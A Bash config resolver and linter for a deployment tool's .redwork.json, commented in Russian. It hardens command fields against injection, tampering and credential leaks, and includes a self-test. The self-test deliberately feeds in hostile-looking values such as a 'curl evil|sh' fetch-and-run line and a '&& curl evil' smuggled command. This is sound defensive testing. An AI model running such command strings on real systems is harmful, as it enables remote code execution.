#!/usr/bin/env bash
# config.sh — резолв+чтение+lint .redwork.json (spec v3 §Command-surface security).
# Инварианты (панель): deploy/rollback/smoke.cmd — argv-массив (анти-инъекция); cred-lint (литералы
# token=/password=/secret= → отказ); git-integrity (.redwork.json tracked + не-modified в рантайме);
# без файла → дефолты (gates=auto, deploy=null → ✋-гейт деплоя).
#
# OUT-OF-TREE CONFIG (2026-06-28, plan-panel verified): конфиг может жить НЕ в code-repo.
# Резолв (precedence): $REDWORK_CONFIG_FILE (env, abs) → $repo/.redwork-config-ref (1 строка → путь) →
# $repo/.redwork.json (default, backward-compat). Integrity всегда выполняется в git-репо, который РЕАЛЬНО
# трекает резолвнутый файл (а не вслепую `git -C $repo`). Защита (security findings):
#   • single-read: после integrity конфиг читается ОДИН раз из committed-blob (`git show HEAD:relpath`) —
#     закрывает TOCTOU (никаких повторных чтений worktree между проверкой и использованием);
#   • anti-redirect: .redwork-config-ref ОБЯЗАН быть tracked+unmodified в $repo (иначе подмена цели);
#   • symlink/traversal: путь канонизируется (realpath), требуется containment под cfg_top, ref санитизируется
#     (1 строка, без control-символов);
#   • fail-closed: env задан, но файла нет → ошибка (не тихий фолбэк); env не задан → фолбэк к default.
# autonomy-gate.sh A4 при out-of-tree (REDWORK_CONFIG_FILE) — fail-closed → human (см. autonomy-gate.sh).
#
# Usage:
#   config.sh read <repo>     → нормализованный JSON конфиг (после lint); exit≠0 при провале lint
#   config.sh lint <repo>     → только проверки; exit 0/≠0
#   config.sh resolve <repo>  → диагностика: откуда резолвится конфиг (resolved_from/path/cfg_top)
#   config.sh --self-test
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
source "$HERE/secret-guard.sh"

CRED_LITERAL_RE='(token|password|passwd|secret|api[_-]?key)[=:][^[:space:]"$]{3,}'   # литерал, НЕ $ENV-ссылка
SHELL_META_RE='[;|&`]|\$\(|>|<'

# структурированная ошибка (warning #6): машинно-парсимый префикс + резолв-контекст.
_err() { echo "✗ REDWORK_ERROR:$1 $2" >&2; }

# канонизация пути (резолв symlink'ов + абсолютизация). realpath есть на macOS(/bin) и Linux;
# фолбэк на readlink -f, затем на pwd -P (резолвит symlink каталога, basename — best-effort).
_canon() {
  local p="$1"
  realpath "$p" 2>/dev/null && return 0
  readlink -f "$p" 2>/dev/null && return 0
  ( cd "$(dirname "$p")" 2>/dev/null && printf '%s/%s\n' "$(pwd -P)" "$(basename "$p")" )
}

# argv-массив или строка? для cmd-полей. Возвращает 0 если безопасно.
_check_cmd() {  # _check_cmd <field> <json_of_cmd_value>
  local field="$1" val="$2"
  local typ; typ="$(printf '%s' "$val" | jq -r 'type')"
  if [ "$typ" = "array" ]; then return 0; fi    # argv — безопасно (нет shell-парсинга)
  if [ "$typ" = "string" ]; then
    local s; s="$(printf '%s' "$val" | jq -r '.')"
    if printf '%s' "$s" | grep -qE "$SHELL_META_RE"; then echo "✗ $field: shell-метасимволы в строке-команде (инъекция) — используй argv-массив" >&2; return 1; fi
    return 0
  fi
  return 0  # null/отсутствует — ок (деплой станет ✋-гейтом)
}

# ── _acquire: резолв → integrity → ОДНО авторитетное чтение. Выставляет глобалы (НЕ звать в $(...)). ──
#   _CFG_PRESENT (1 есть конфиг / 0 нет → дефолты) · _CFG_CONTENT (авторитетный JSON) ·
#   _CFG_IS_GIT (1/0, драйвит A08) · _CFG_RESOLVED_FROM (env|ref|default) · _CFG_PATH · _CFG_TOP
_acquire() {
  local repo="${1:?repo}"
  _CFG_PRESENT=0; _CFG_CONTENT=""; _CFG_IS_GIT=0; _CFG_RESOLVED_FROM=""; _CFG_PATH=""; _CFG_TOP=""
  local mech path

  # ---- РЕЗОЛВ (precedence: env → ref → default) ----
  if [ -n "${REDWORK_CONFIG_FILE:-}" ]; then
    mech=env; path="$REDWORK_CONFIG_FILE"
    case "$path" in /*) ;; *) _err CONFIG_ENV_NOT_ABS "REDWORK_CONFIG_FILE должен быть абсолютным путём: $path"; return 1 ;; esac
    [ -f "$path" ] || { _err CONFIG_MISSING "REDWORK_CONFIG_FILE задан, но файла нет: $path (fail-closed — НЕ тихий фолбэк)"; return 1; }
  elif [ -f "$repo/.redwork-config-ref" ]; then
    mech=ref
    # anti-redirect: ссылка ОБЯЗАНА быть tracked+unmodified в git $repo (иначе подмена цели в рантайме)
    git -C "$repo" rev-parse --git-dir >/dev/null 2>&1 || { _err REF_NOT_GIT ".redwork-config-ref в НЕ-git $repo — integrity ссылки не гарантируется"; return 1; }
    git -C "$repo" ls-files --error-unmatch .redwork-config-ref >/dev/null 2>&1 || { _err REF_UNTRACKED ".redwork-config-ref не git-tracked — возможна подмена цели конфига"; return 1; }
    git -C "$repo" diff HEAD --quiet -- .redwork-config-ref 2>/dev/null || { _err REF_MODIFIED ".redwork-config-ref modified/staged — возможна подмена цели конфига"; return 1; }
    # санитизация: ровно одна непустая строка, без control-символов
    local ref="$repo/.redwork-config-ref" raw nonempty
    nonempty="$(grep -cve '^[[:space:]]*$' "$ref" 2>/dev/null || echo 0)"
    [ "${nonempty:-0}" -le 1 ] || { _err REF_MULTILINE ".redwork-config-ref содержит >1 непустой строки — неоднозначная цель"; return 1; }
    IFS= read -r raw < "$ref" 2>/dev/null || true
    raw="${raw#"${raw%%[![:space:]]*}"}"; raw="${raw%"${raw##*[![:space:]]}"}"   # trim
    [ -n "$raw" ] || { _err REF_EMPTY ".redwork-config-ref пуст"; return 1; }
    printf '%s' "$raw" | LC_ALL=C grep -q '[[:cntrl:]]' && { _err REF_CTRL "control-символы в .redwork-config-ref"; return 1; }
    case "$raw" in /*) path="$raw" ;; *) path="$repo/$raw" ;; esac
    [ -f "$path" ] || { _err CONFIG_MISSING "цель .redwork-config-ref не найдена: $path"; return 1; }
  else
    mech=default; path="$repo/.redwork.json"
    [ -f "$path" ] || { _CFG_RESOLVED_FROM=default; _CFG_PRESENT=0; return 0; }   # нет файла → дефолты
  fi
  _CFG_RESOLVED_FROM="$mech"

  # ---- КАНОНИЗАЦИЯ (symlink/traversal hardening) ----
  local real; real="$(_canon "$path")"
  { [ -n "$real" ] && [ -f "$real" ]; } || { _err CONFIG_CANON "не удалось канонизировать путь конфига: $path"; return 1; }
  _CFG_PATH="$real"

  # ---- git, который РЕАЛЬНО трекает резолвнутый файл ----
  local cfg_dir cfg_top=""
  cfg_dir="$(dirname "$real")"
  if git -C "$cfg_dir" rev-parse --git-dir >/dev/null 2>&1; then
    cfg_top="$(_canon "$(git -C "$cfg_dir" rev-parse --show-toplevel)")"
  fi

  if [ -n "$cfg_top" ]; then
    # containment: канонический файл обязан жить ПОД cfg_top (ловит symlink-наружу / ../ traversal)
    case "$real/" in "$cfg_top"/*) ;; *) _err CONFIG_OUTSIDE_REPO "конфиг $real вне своего git-репо $cfg_top (symlink/traversal?)"; return 1 ;; esac
    local relpath="${real#"$cfg_top"/}"
    git -C "$cfg_top" ls-files --error-unmatch "$relpath" >/dev/null 2>&1 || { _err CONFIG_UNTRACKED "$relpath не git-tracked в $cfg_top — integrity не гарантируется"; return 1; }
    git -C "$cfg_top" diff HEAD --quiet -- "$relpath" 2>/dev/null || { _err CONFIG_MODIFIED "$relpath modified/staged в $cfg_top — возможна подмена команд; закоммить или откати"; return 1; }
    # SINGLE authoritative read из committed-blob → закрывает TOCTOU (НЕ читаем worktree повторно)
    _CFG_CONTENT="$(git -C "$cfg_top" show "HEAD:$relpath" 2>/dev/null)" || { _err CONFIG_BLOB "не удалось прочитать committed-blob HEAD:$relpath из $cfg_top"; return 1; }
    _CFG_IS_GIT=1; _CFG_TOP="$cfg_top"
    local sha; sha="$(git -C "$cfg_top" rev-parse --short "HEAD:$relpath" 2>/dev/null || echo n/a)"
    printf 'ℹ redwork-config resolved_from=%s path=%s cfg_top=%s blob=%s\n' "$_CFG_RESOLVED_FROM" "$_CFG_PATH" "$_CFG_TOP" "$sha" >&2
  else
    # НЕ-git: integrity не гарантируется → исполняемые поля зарежем в _validate (A08). worktree-чтение
    # безопасно, т.к. RCE-вектор (exec-поля) заблокирован; команд из не-git конфига не исполняем.
    _CFG_CONTENT="$(cat "$real")" || { _err CONFIG_READ "не удалось прочитать $real"; return 1; }
    _CFG_IS_GIT=0; _CFG_TOP=""
    printf 'ℹ redwork-config resolved_from=%s path=%s cfg_top=(non-git) blob=n/a\n' "$_CFG_RESOLVED_FROM" "$_CFG_PATH" >&2
  fi
  _CFG_PRESENT=1
  return 0
}

# ── _validate_content: проверки на УЖЕ авторитетном $_CFG_CONTENT (JSON+A08+cred+command-surface) ──
_validate_content() {
  printf '%s' "$_CFG_CONTENT" | jq -e . >/dev/null 2>&1 || { _err CONFIG_INVALID_JSON ".redwork.json не валидный JSON"; return 1; }
  # A08: исполняемые поля требуют git-integrity (в не-git — режем все, не только deploy.cmd)
  if [ "$_CFG_IS_GIT" != 1 ]; then
    local has_exec; has_exec="$(printf '%s' "$_CFG_CONTENT" | jq -r '[.deploy.cmd, .deploy.rollback.cmd, .deploy.smoke.cmd, (if (.gates|type)=="array" then "x" else empty end)] | map(select(.!=null)) | length')"
    if [ "${has_exec:-0}" -gt 0 ]; then _err CONFIG_EXEC_NONGIT "исполняемые поля (deploy/rollback/smoke/gates-list) в НЕ-git конфиге — integrity не гарантируется (A08). Нужен git-tracked конфиг."; return 1; fi
  fi
  # cred-lint: литеральные креды в любом cmd/env-значении (op://...|$VAR разрешены)
  local blob; blob="$(printf '%s' "$_CFG_CONTENT" | jq -c '[.deploy.cmd, .deploy.rollback.cmd, .deploy.smoke.cmd, (.deploy.env//[])[], (.gates//empty), .e2e.cmd] | flatten' 2>/dev/null || echo '[]')"
  local viol; viol="$(printf '%s' "$blob" | jq -r '.[]? | select(type=="string")' | grep -iE "$CRED_LITERAL_RE" | grep -viE 'op://|\$[A-Za-z_]' || true)"
  if [ -n "$viol" ]; then _err CONFIG_CRED_LITERAL "литеральные креды в конфиге — только \$ENV+op://. Нарушение: $(printf '%s' "$viol" | head -1)"; return 1; fi
  # command-surface: cmd-поля argv/безопасны
  local f v
  for f in '.deploy.cmd' '.deploy.rollback.cmd' '.deploy.smoke.cmd'; do
    v="$(printf '%s' "$_CFG_CONTENT" | jq -c "$f // null")"
    [ "$v" = "null" ] || _check_cmd "$f" "$v" || return 1
  done
  return 0
}

lint() {
  local repo="${1:?repo}"
  _acquire "$repo" || return 1
  if [ "$_CFG_PRESENT" = 0 ]; then echo "ℹ нет .redwork.json → дефолты (detect-gates + ✋-гейт деплоя)"; return 0; fi
  _validate_content || return 1
  echo "✓ .redwork.json lint passed"
}

read_cfg() {
  local repo="${1:?repo}"
  _acquire "$repo" || return 1
  local DEFAULTS='{"gates":"auto","e2e":null,"staging":{"url":null},"deploy":null,"risk":{"add_human_globs":[],"max_auto_files":20},"monitoring":{"alert_channels":[],"signals":[],"post_deploy_watch_minutes":30}}'
  if [ "$_CFG_PRESENT" = 0 ]; then printf '%s\n' "$DEFAULTS"; return 0; fi
  _validate_content >&2 || return 1
  printf '%s' "$_CFG_CONTENT" | jq --argjson d "$DEFAULTS" '$d * .'
}

resolve() {  # диагностика: где конфиг и как резолвится
  local repo="${1:?repo}"
  if _acquire "$repo"; then
    if [ "$_CFG_PRESENT" = 0 ]; then echo "resolved_from=none (нет конфига → дефолты)"; else
      printf 'resolved_from=%s path=%s cfg_top=%s is_git=%s\n' "$_CFG_RESOLVED_FROM" "$_CFG_PATH" "${_CFG_TOP:-(non-git)}" "$_CFG_IS_GIT"; fi
  else return 1; fi
}

self_test() {
  set +e; local T; T="$(mktemp -d)"; local fail=0
  ok(){ if [ "$1" -eq 0 ]; then :; else echo "  ✗ $2"; fail=1; fi; }
  # git-репо с закоммиченным конфигом (deploy требует git-integrity)
  _mkgit(){ local d; d="$(mktemp -d)"; git -C "$d" init -q; git -C "$d" config user.email t@t; git -C "$d" config user.name t
            cat > "$d/.redwork.json"; git -C "$d" add .redwork.json; git -C "$d" commit -qm c >/dev/null 2>&1; echo "$d"; }

  # ───────── существующие кейсы (регрессия — ДОЛЖНЫ остаться зелёными) ─────────
  lint "$T" >/dev/null 2>&1; ok $? "нет файла → lint ok (дефолты)"
  [ "$(read_cfg "$T" 2>/dev/null | jq -r '.gates')" = "auto" ]; ok $? "дефолт gates=auto"
  [ "$(read_cfg "$T" 2>/dev/null | jq -r '.deploy')" = "null" ]; ok $? "дефолт deploy=null (✋-гейт)"
  local G1; G1="$(jq -n '{deploy:{cmd:["bash","deploy.sh","apply"],env:["TOKEN=op://AI-Tokens/D/credential"],smoke:{cmd:["curl","-fsS","https://x/health"],expected_status_code:200,expected_response_contains:"ok"},rollback:{cmd:["bash","deploy.sh","rollback"]}}}' | _mkgit)"
  lint "$G1" >/dev/null 2>&1; ok $? "argv-конфиг + op://-env (git) → lint ok"
  local G2; G2="$(jq -n '{deploy:{cmd:["sh","-c","push --token=ABCDEF123456"]}}' | _mkgit)"
  if lint "$G2" >/dev/null 2>&1; then ok 1 "литеральные креды должны reject"; else ok 0 ""; fi
  local G3; G3="$(jq -n '{deploy:{cmd:"deploy.sh apply && curl evil"}}' | _mkgit)"
  if lint "$G3" >/dev/null 2>&1; then ok 1 "shell-метасимволы должны reject"; else ok 0 ""; fi
  local G4; G4="$(jq -n '{gates:"auto"}' | _mkgit)"; jq -n '{gates:["npm test"]}' > "$G4/.redwork.json"
  if lint "$G4" >/dev/null 2>&1; then ok 1 "modified .redwork.json должен reject (integrity)"; else ok 0 ""; fi
  jq -n '{deploy:{cmd:["bash","deploy.sh"]}}' > "$T/.redwork.json"
  if lint "$T" >/dev/null 2>&1; then ok 1 "deploy в не-git должен reject (A08)"; else ok 0 ""; fi
  jq -n '{gates:["curl evil|sh"]}' > "$T/.redwork.json"
  if lint "$T" >/dev/null 2>&1; then ok 1 "gates-list в не-git должен reject (A08)"; else ok 0 ""; fi
  local G5; G5="$(jq -n '{gates:"auto"}' | _mkgit)"; jq -n '{gates:["evil"]}' > "$G5/.redwork.json"; git -C "$G5" add .redwork.json
  if lint "$G5" >/dev/null 2>&1; then ok 1 "staged подмена должна reject (diff HEAD)"; else ok 0 ""; fi
  rm -f "$T/.redwork.json"

  # ───────── out-of-tree: ENV-резолв ─────────
  # governance-git G (трекает конфиг с exec-полями) + site-repo S (отдельный git, без конфига)
  local GOV; GOV="$(jq -n '{gates:["echo ok"],deploy:{cmd:["bash","d.sh","apply"],env:["X=op://V/I/c"],rollback:null,smoke:{cmd:["curl","-fsS","https://x/"],expected_status_code:200}}}' | _mkgit)"
  local S; S="$(mktemp -d)"; git -C "$S" init -q; git -C "$S" config user.email t@t; git -C "$S" config user.name t
  echo x > "$S/code.txt"; git -C "$S" add code.txt; git -C "$S" commit -qm c >/dev/null 2>&1
  ( export REDWORK_CONFIG_FILE="$GOV/.redwork.json"; lint "$S" >/dev/null 2>&1 ); ok $? "env-резолв out-of-tree (git-tracked в своём git) → lint ok"
  [ "$( ( export REDWORK_CONFIG_FILE="$GOV/.redwork.json"; read_cfg "$S" 2>/dev/null ) | jq -r '.deploy.cmd[0]')" = "bash" ]; ok $? "env-резолв read_cfg отдаёт committed-blob"
  # env задан, файла нет → fail-closed (НЕ тихий фолбэк к default)
  if ( export REDWORK_CONFIG_FILE="$S/nope.json"; lint "$S" >/dev/null 2>&1 ); then ok 1 "env-set+missing должен reject (CONFIG_MISSING)"; else ok 0 ""; fi
  # env относительный → reject
  if ( export REDWORK_CONFIG_FILE="rel/path.json"; lint "$S" >/dev/null 2>&1 ); then ok 1 "env неабсолютный должен reject"; else ok 0 ""; fi
  # env НЕ задан + нет default → дефолты (фолбэк, не ошибка)
  lint "$S" >/dev/null 2>&1; ok $? "env-unset + нет конфига → дефолты (фолбэк)"

  # ───────── out-of-tree: TOCTOU (modified worktree-цель в своём git → reject) ─────────
  jq -n '{gates:["evil"]}' > "$GOV/.redwork.json"   # подмена worktree уже после коммита
  if ( export REDWORK_CONFIG_FILE="$GOV/.redwork.json"; lint "$S" >/dev/null 2>&1 ); then ok 1 "out-of-tree modified-цель должен reject (diff HEAD)"; else ok 0 ""; fi
  git -C "$GOV" checkout -q -- .redwork.json   # вернуть committed

  # ───────── out-of-tree: цель в НЕ-git каталоге с exec-полями → A08 reject ─────────
  local NG; NG="$(mktemp -d)"; jq -n '{deploy:{cmd:["bash","x"]}}' > "$NG/c.json"
  if ( export REDWORK_CONFIG_FILE="$NG/c.json"; lint "$S" >/dev/null 2>&1 ); then ok 1 "out-of-tree не-git + exec → reject (A08)"; else ok 0 ""; fi

  # ───────── anti-redirect: .redwork-config-ref ─────────
  # ref tracked+clean → цель в GOV → ok
  printf '%s\n' "$GOV/.redwork.json" > "$S/.redwork-config-ref"; git -C "$S" add .redwork-config-ref; git -C "$S" commit -qm ref >/dev/null 2>&1
  lint "$S" >/dev/null 2>&1; ok $? "ref-резолв (ref tracked+clean, цель tracked) → lint ok"
  # ref modified (worktree) → reject
  printf '%s\n' "$NG/c.json" > "$S/.redwork-config-ref"
  if lint "$S" >/dev/null 2>&1; then ok 1 "modified ref должен reject (anti-redirect)"; else ok 0 ""; fi
  git -C "$S" checkout -q -- .redwork-config-ref
  # ref untracked → reject
  local S2; S2="$(mktemp -d)"; git -C "$S2" init -q; git -C "$S2" config user.email t@t; git -C "$S2" config user.name t
  echo x > "$S2/code.txt"; git -C "$S2" add code.txt; git -C "$S2" commit -qm c >/dev/null 2>&1
  printf '%s\n' "$GOV/.redwork.json" > "$S2/.redwork-config-ref"   # untracked
  if lint "$S2" >/dev/null 2>&1; then ok 1 "untracked ref должен reject (anti-redirect)"; else ok 0 ""; fi
  # ref multiline → reject
  printf '%s\nextra\n' "$GOV/.redwork.json" > "$S2/.redwork-config-ref"; git -C "$S2" add .redwork-config-ref; git -C "$S2" commit -qm m >/dev/null 2>&1
  if lint "$S2" >/dev/null 2>&1; then ok 1 "multiline ref должен reject"; else ok 0 ""; fi

  # ───────── symlink/traversal hardening ─────────
  # symlink-цель наружу (в не-git /tmp) с exec-полями → reject (A08 после канонизации)
  local SL; SL="$(mktemp -d)"; jq -n '{deploy:{cmd:["bash","x"]}}' > "$SL/real.json"
  ln -s "$SL/real.json" "$GOV/link.json"
  if ( export REDWORK_CONFIG_FILE="$GOV/link.json"; lint "$S" >/dev/null 2>&1 ); then ok 1 "symlink наружу (в не-git) должен reject (canon+A08)"; else ok 0 ""; fi
  rm -f "$GOV/link.json"
  # traversal в env → файла нет → reject
  if ( export REDWORK_CONFIG_FILE="$GOV/../nope/x.json"; lint "$S" >/dev/null 2>&1 ); then ok 1 "traversal на несуществующее должен reject"; else ok 0 ""; fi

  # ───────── separate-git-dir fidelity (governance-архетип termoport) ─────────
  local SGD_WT SGD_GD; SGD_WT="$(mktemp -d)"; SGD_GD="$(mktemp -d)/gov.git"
  git init -q --separate-git-dir="$SGD_GD" "$SGD_WT"
  git -C "$SGD_WT" config user.email t@t; git -C "$SGD_WT" config user.name t
  jq -n '{gates:["echo ok"],deploy:{cmd:["bash","d.sh"],rollback:null}}' > "$SGD_WT/.redwork.json"
  git -C "$SGD_WT" add .redwork.json; git -C "$SGD_WT" commit -qm c >/dev/null 2>&1
  ( export REDWORK_CONFIG_FILE="$SGD_WT/.redwork.json"; lint "$S" >/dev/null 2>&1 ); ok $? "separate-git-dir конфиг (governance-архетип) → lint ok"

  rm -rf "$T" "$G1" "$G2" "$G3" "$G4" "$G5" "$GOV" "$S" "$S2" "$NG" "$SL" "$SGD_WT" "${SGD_GD%/*}"
  if [ "$fail" -eq 0 ]; then echo "✓ config self-test passed"; return 0; else echo "✗ config self-test FAILED"; return 1; fi
}

case "${1:-}" in
  read) read_cfg "${2:?repo}" ;;
  lint) lint "${2:?repo}" ;;
  resolve) resolve "${2:?repo}" ;;
  --self-test) self_test ;;
  *) echo "usage: config.sh read|lint|resolve <repo> | --self-test" >&2; exit 1 ;;
esac
